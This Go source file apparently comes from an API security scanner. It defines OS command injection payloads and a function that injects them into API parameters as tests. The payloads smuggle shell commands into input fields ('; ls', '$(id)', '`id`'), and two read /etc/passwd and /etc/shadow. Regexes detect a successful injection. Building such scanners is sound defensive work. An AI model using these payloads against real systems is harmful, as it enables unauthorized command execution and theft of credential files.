package tgen

import "github.com/offat-x/offat-x/pkg/parser"

var osCommandPayloads = []Payload{
	{InjText: "; ls", VulnerableResponseCodes: []int{200}, Regex: `(bin|etc|usr|var|root|home)`},
	{InjText: "| id", VulnerableResponseCodes: []int{200}, Regex: `uid=\d+\(\w+\)`},
	{InjText: "& whoami", VulnerableResponseCodes: []int{200}, Regex: `(root|www-data|ubuntu|admin)`},
	{InjText: "`id`", VulnerableResponseCodes: []int{200}, Regex: `uid=\d+\(\w+\)`},
	{InjText: "$(id)", VulnerableResponseCodes: []int{200}, Regex: `uid=\d+\(\w+\)`},
	{InjText: "; cat /etc/passwd", VulnerableResponseCodes: []int{200}, Regex: `root:x:0:0:`},
	{InjText: "| cat /etc/shadow", VulnerableResponseCodes: []int{200}, Regex: `root:\$`},
}

// BasicOsCommandInjectionTest generates OS command injection tests.
func BasicOsCommandInjectionTest(baseURL string, docParams []*parser.DocHttpParams, queryParams map[string]string, headers map[string]string, cfg InjectionConfig) []*ApiTest {
	cfg.Payloads = osCommandPayloads
	return injectParamIntoApiTest(baseURL, docParams, queryParams, headers, "Basic OS Command Injection Test", cfg)
}
